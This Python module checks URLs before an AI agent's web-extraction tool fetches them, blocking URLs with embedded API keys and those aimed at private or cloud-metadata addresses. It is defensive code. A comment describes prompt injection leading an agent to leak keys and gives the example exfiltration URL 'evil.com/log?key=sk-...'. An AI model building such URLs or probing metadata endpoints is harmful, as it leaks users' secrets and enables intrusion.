"""
security.py — URL safety checks before any fetch.

Two checks lifted from Hermes web_extract_tool():
1. Secret scan — block URLs containing API keys (sk-, api_key=, etc.)
2. SSRF filter — block URLs targeting private/internal networks

Called by web_extract() before dispatching to any provider.
These run on the URL strings only — no network I/O.

Hermes equivalents:
- agent.redact._PREFIX_RE (secret detection)
- tools.url_safety.is_safe_url (SSRF protection)
"""

from __future__ import annotations

import re
from ipaddress import ip_address
from urllib.parse import unquote, urlparse


# ── Secret detection ──────────────────────────────────────────────────────────
# Catches common API key prefixes in URLs. A malicious prompt could trick
# the agent into exfiltrating secrets via URL parameters like:
#   https://evil.com/log?key=sk-abc123...
#
# Hermes uses agent.redact._PREFIX_RE — we use a simplified version.

_SECRET_PREFIXES = re.compile(
    r"(sk-[a-zA-Z0-9]{10})"       # OpenAI / Anthropic keys
    r"|(api_key=[a-zA-Z0-9]{10})"  # generic api_key= param
    r"|(token=[a-zA-Z0-9]{10})"    # generic token= param
    r"|(password=[^\s&]{5})",      # password in query string
    re.IGNORECASE,
)


def has_embedded_secret(url: str) -> bool:
    """Return True if url contains what looks like an API key or token."""
    return bool(
        _SECRET_PREFIXES.search(url) or _SECRET_PREFIXES.search(unquote(url))
    )


# ── SSRF protection ──────────────────────────────────────────────────────────
# Block requests to private/internal network addresses. Prevents the agent
# from being used to probe localhost, routers, cloud metadata endpoints, etc.
#
# Hermes equivalent: tools.url_safety.is_safe_url()

_BLOCKED_HOSTS = {
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "::1",
    "metadata.google.internal",       # GCP metadata
    "169.254.169.254",                # AWS/Azure/GCP metadata endpoint
}


def is_safe_url(url: str) -> bool:
    """Return True if url does NOT target a private/internal address."""
    try:
        parsed = urlparse(url)
        host = (parsed.hostname or "").lower().strip()

        # Block known dangerous hostnames
        if host in _BLOCKED_HOSTS:
            return False

        # Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
        try:
            addr = ip_address(host)
            if addr.is_private or addr.is_loopback or addr.is_link_local:
                return False
        except ValueError:
            pass  # hostname, not IP — that's fine

        # Must have a scheme
        if parsed.scheme not in ("http", "https"):
            return False

        return True
    except Exception:
        return False


# ── Public API ────────────────────────────────────────────────────────────────

def check_urls(urls: list[str]) -> tuple[list[str], list[dict]]:
    """Filter a list of URLs, returning (safe_urls, blocked_reports).

    Each blocked report is a dict with url + error message, matching
    the shape web_extract() merges back into results.

    Hermes does this inline in web_extract_tool(). We extract it here
    so the main function stays clean.
    """
    safe = []
    blocked = []

    for url in urls:
        if has_embedded_secret(url):
            blocked.append({
                "url": url,
                "error": "Blocked: URL contains what appears to be an API key or token.",
            })
        elif not is_safe_url(url):
            blocked.append({
                "url": url,
                "error": "Blocked: URL targets a private or internal network address.",
            })
        else:
            safe.append(url)

    return safe, blocked
